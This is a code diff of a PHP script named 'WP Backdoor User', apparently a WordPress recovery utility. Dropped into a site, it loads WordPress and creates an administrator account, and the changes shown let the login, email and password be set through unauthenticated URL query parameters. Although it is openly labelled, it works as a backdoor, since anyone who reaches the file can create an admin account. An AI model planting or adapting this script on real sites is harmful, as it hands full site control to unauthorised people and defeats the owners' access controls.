@@ -1,24 +1,35 @@
 <?php
+/*********************************************
+=== WP Backdoor User ===
+
+Script Name: WP Backdoor User
+Script URI: http://www.boiteaweb.fr/WPBU
+Author URI: http://www.boiteaweb.fr
+Author: Julio Potier
+Version: 1.0
+Tags: wordpress, security, admin, user, wp
+License: GPL
+**********************************************/
 // Force the file to be renamed for security reasons
 if( strtolower( basename( __FILE__ ) ) == 'wp_backdoor_user.php' )
 	die( 'EN: Please rename the file before use! FR : Merci de renommer le fichier avant utilisation !' );
 
 // Load WordPress
 while( !is_file( 'wp-load.php' ) ) {
-	if( is_dir( '../' ) 
-		chdir( '../' );
+	if( is_dir( '..' ) ) 
+		chdir( '..' );
 	else
 		die( 'EN: Could not find WordPress! FR : Impossible de trouver WordPress !' );
 }
-require_once( dirname(__FILE__) . '/wp-load.php' );
+require_once( 'wp-load.php' );
 
 // Require all users functions
 require_once( ABSPATH . WPINC . '/user.php');
  
 // Default new user informations
-$new_user_login = 'admin_user_'.uniqid();
-$new_user_email = get_option( 'admin_email' );
-$new_user_pass = time();
+$new_user_login = $_GET['user_login'] != '' ? $_GET['user_login'] : 'admin_user_' . uniqid();
+$new_user_email = str_replace( ' ', '+', $_GET['user_email'] != '' ? $_GET['user_email'] : time() . '@fake' . time() . '.com' );
+$new_user_pass = $_GET['user_pass'] != '' ? $_GET['user_pass'] : time();
 
 // Is this user_exists, stop script
 if( username_exists( $new_user_login ) )
@@ -29,7 +40,7 @@ $my_user_id = wp_create_user( $new_user_login, $new_user_pass, $new_user_email )
   
 // Problem on creation ? Stop script
 if( is_wp_error( $my_user_id ) )
-    wp_die( new WP_Error( 'registerfail', sprintf( __( '<strong>ERROR</strong>: Couldn&#8217;t register you... please contact the <a href="mailto:%s">webmaster</a> !' ), get_option( 'admin_email' ) ) ) );
+    wp_die( new WP_Error( 'registerfail', sprintf( __( '<strong>ERROR</strong>: Couldn&#8217;t register you... please contact the <a href="mailto:%s">webmaster</a> !' ), esc_attr( get_option( 'admin_email' ) ) ) ) );
  
 // Set admin role to this user
 $user = new WP_User( $my_user_id );
